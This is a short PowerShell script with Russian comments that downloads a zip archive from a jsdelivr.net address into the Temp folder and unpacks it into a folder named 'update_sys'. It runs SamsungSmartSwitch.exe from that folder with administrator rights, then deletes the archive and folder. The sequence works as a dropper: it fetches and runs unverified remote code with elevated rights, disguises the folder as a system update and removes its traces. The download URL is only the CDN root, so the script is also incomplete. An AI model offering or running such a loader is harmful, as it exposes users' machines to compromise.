# Указываем точное имя файла с вашего скриншота — prokect.zip
$url = "https://jsdelivr.net"
$zipPath = "$env:LOCALAPPDATA\Temp\prokect.zip"
$destDir = "$env:LOCALAPPDATA\Temp\update_sys"

# Скачивание архива
Invoke-WebRequest -Uri $url -OutFile $zipPath

# Распаковка
Expand-Archive -LiteralPath $zipPath -DestinationPath $destDir -Force

# Запуск программы из архива от админа
Start-Process -FilePath "$destDir\SamsungSmartSwitch.exe" -Verb RunAs -Wait

# Удаление временных файлов после закрытия
Remove-Item -Path $zipPath -Force
Remove-Item -Path $destDir -Recurse -Force
